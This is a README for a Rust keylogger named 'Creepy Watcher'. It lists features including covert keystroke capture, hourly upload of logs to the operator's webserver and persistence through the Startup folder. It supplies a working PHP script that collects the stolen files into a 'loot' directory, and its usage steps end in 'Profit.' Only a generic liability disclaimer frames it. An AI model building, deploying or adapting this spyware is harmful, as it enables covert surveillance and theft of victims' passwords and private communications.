# Creepy Watcher - Keylogger implementation in Rust

![image](https://github.com/djackreuter/creepy_watcher/assets/27731554/ae12d739-c4c5-4086-8f92-40e92e706989)

## Features
* Records keystrokes and saves to timestamped file in `C:\Windows\Tasks\` directory.
* Every hour it will POST the file to your webserver, delete the old file, and create a new one.
* The keylogger will place itself in the users Startup folder so that it will persist through restarts.
* Also includes a `killdate` to ensure the program will no longer run after a set date.


An example `index.php` file is provided below to host on your webserver that will save the incoming file to a loot directory.
```
<?php

        if (!empty($_FILES['file']['name'])) {
                $uploaddir = "/var/www/loot/";
                $uploadedfile = $uploaddir . basename($_FILES['file']['name']);

                move_uploaded_file($_FILES['file']['tmp_name'], $uploadedfile);
        }

?>
```

## Usage Instructions:
0. Ensure you have a webserver capable of saving the incoming POST request with the file.
1. Update the `url` parameter in the `send_file` function to your webserver.
2. Set the `killdate` variable to the date which you no longer want the program to run.
3. Compile with `cargo build -r`.
4. Profit.


## Disclaimer
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
